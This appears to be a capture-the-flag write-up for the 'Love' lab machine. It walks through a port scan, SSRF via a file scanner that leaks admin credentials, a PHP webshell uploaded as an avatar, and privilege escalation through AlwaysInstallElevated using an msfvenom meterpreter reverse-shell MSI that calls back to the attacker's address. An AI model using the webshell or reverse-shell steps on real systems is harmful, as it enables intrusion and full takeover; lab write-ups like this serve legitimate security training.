# Love

## Discovery

### Services

```
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings:
|   oracle-tns:
|_    Host '10.10.16.26' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
```

### Directories

```
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/]
/index.php            (Status: 200) [Size: 4388]
/preview.php          (Status: 302) [Size: 0] [--> index.php]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/login.php            (Status: 302) [Size: 0] [--> index.php]
/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/examples             (Status: 503) [Size: 402]
/licenses             (Status: 403) [Size: 421]
/dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]
/tcpdf                (Status: 301) [Size: 337] [--> http://10.10.10.239/tcpdf/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
```

The directories can be browsed: if we ever get to upload a payload, it may end
up in "/images".

## The file scanner

Let's add `staging.love.htb` to our hosts:

```bash
echo 10.10.10.239 staging.love.htb >> /etc/hosts
```

The subdomain [staging.love.htb](http://staging.love.htb) leads to a
file scanning web service.

The content of the file is escaped and included in the server php:

```php
<!--?php system(urldecode($_REQUEST['apehex']));-->
```

We can include local files like `http://127.0.0.1/index.php`. Trying all the
discovered urls, finally `http://127.0.0.1:5000` shows its true face:

> Vote Admin Creds admin: @LoveIsInTheAir!!!!

## Planting a backdoor

Changing a voter's avatar will upload a "photo" to the "images" subdirectory.

So we upload a basic webshell, for a change:

```php
<?php system($_REQUEST['apehex']);?>
```

We can get the user flag now:

```
apehex=whoami
apehex=type C:\Users\Phoebe\Desktop\user.txt
```

## Escalation

From there, let's directly look for an escalation vector, using `PrivescCheck`:

```powershell
powershell -ep bypass -c ". .\pec.ps1; Invoke-PrivescCheck -Extended"
```

```
+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[*] Found 2 result(s).


Enabled               : True
Name                  : HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated : 1

Enabled               : True
Name                  : HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated : 1
```

This allows us to create a reverse shell with:

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.31 lport=1234 -f msi > www/evil.msi
```

And, after starting the handler in msf, this command will launch the shell:

```
msiexec /quiet /qn /i evil.msi
```
